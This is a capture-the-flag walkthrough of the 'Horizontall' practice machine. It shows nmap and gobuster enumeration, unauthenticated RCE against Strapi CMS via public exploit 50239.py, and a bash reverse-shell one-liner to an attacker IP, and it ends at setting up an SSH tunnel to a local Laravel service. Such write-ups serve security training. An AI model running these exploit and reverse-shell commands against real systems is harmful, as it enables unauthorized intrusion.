### Recon

Initiating reconnaissance

```
sudo nmap -sC -sV 10.10.11.105
```

With the following results:

```
Nmap scan report for 10.10.11.105
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The Nmap output reveals just ports open. On port 22 SSH is running and on port 80 an Nginx web server.
Since we have no credentials to try logging in with SSH we turn our attention to port 80. Nmap didn't follow a redirect to http://horizontall.htb upon making a request on port 80. Let's modify our hosts file to include horizontall.htb .

```
echo "10.10.11.105 horizontall.htb" | sudo tee -a /etc/hosts
```

### Enumeration

The website itself doesn't have many functionalities. In fact none of the buttons work and those that do
work redirect to the homepage.
Inspecting the requests made upon visitng the website we see some interesting Javascript files. It seems that the website is a "Single Page Application (SPA)" that was made using Vue Js. 
After using an online Javascript beautifier to make the contents of app.c68eb462.js more readable, a new vhost is discovered. We should modify our hosts file once again.

```
echo "10.10.11.105 api-prod.horizontall.htb" | sudo tee -a /etc/hosts
```

Since browsing to http://api-prod.horizontall.htb reveals a simple Welcome we could use Gobuster to bruteforce any available directories.

```
gobuster dir -u http://api-prod.horizontall.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster -t 50
```

With the following results:

```
/admin                (Status: 200) [Size: 854]
/Admin                (Status: 200) [Size: 854]
/reviews              (Status: 200) [Size: 507]
/users                (Status: 403) [Size: 60]
/.                    (Status: 200) [Size: 413]
/ADMIN                (Status: 200) [Size: 854]
/Users                (Status: 403) [Size: 60]
/Reviews              (Status: 200) [Size: 507]
```

The /admin directory seems like the most promising. Upon visiting http://api-
prod.horizontall.htb/admin we are presented with the administrator panel for Strapi 
According to the official webpage, Strapi is an open source Node.js Headless CMS.

### Exploitation

Using Searchsploit on our local machine to search for possible exploits for the Strapi CMS we are presented with a few options.
According to the exploit titles, version 3.0.0-beta.17.4 of Strapi CMS is vulnerable to Remote Code Execution (RCE), without being authenticated, in the administrator panel. Since we do not have any credential to try on the administrator panel we should find out if the version on the remote machine matches the one on the exploit.
We should copy the exploit script on our local folder using the command 'searchsploit -m 50239.py' and take a closer look on the source code.
Inside the script there is a function called check_version() that makes a request to /admin/init to check if the remote instance of Strapi is vulnerable to this exploit. We could visit this endpoint to verify manually if we can use this exploit.

strapiVersion	"3.0.0-beta.17.4"

The version matches the one that the exploit needs to work so execute the script to get a shell:
```
python3 50239.py http://api-prod.horizontall.htb
```

The exploit worked, but we can't be certain because we are informed that this is a blind RCE so we can't have any output to our commands. We could try to get a proper reverse shell. First, we set up a listener on our local machine.
```
nc -lnvp 9001
listening on [any] 9001 ...
```

Then, we send a bash reverse shell command through the exploit script:
```
bash -c 'bash -i >& /dev/tcp/10.10.14.4/9001 0>&1'
```

And it works:
```
strapi@horizontall:~/myapi$ pwd
pwd
/opt/strapi/myapi
```

It is worth noting that the exploit used relies on two seperate CVEs. The first one, CVE-2019-18818, allows
attackers to reset the Administrator's password. Then, after authenticating to Strapi the CVE-2019-19609
can be leveraged to gain remote code execution.

# Privilege Escalation

Our next step would be to look for services listening only on localhost, meaning that our initial Nmap scan would not be able to discover.
```
ss -alnp | grep "127.0.0.1"
```
The port 3306 is the default port for MySQL . That leaves us with two not common ports, port 1337 and 8000 . We can use Curl to see what services are running on these two ports.

Port 8000:
Laravel v8 (PHP v7.4.18)

On port 1337 it seems that we have the Strapi CMS page with the single Welcome. message. On port 8000 , though, we have Laravel framework. Our external enumeration did not reveal any information about the Laravel framework on the machine, so we should investigate this finding further.

Using SSH tunneling we can forward a local port to localhost:8000 on the remote machine.
```
ssh -i strapi -L 8000:localhost:8000 strapi@horizontall.htb
```





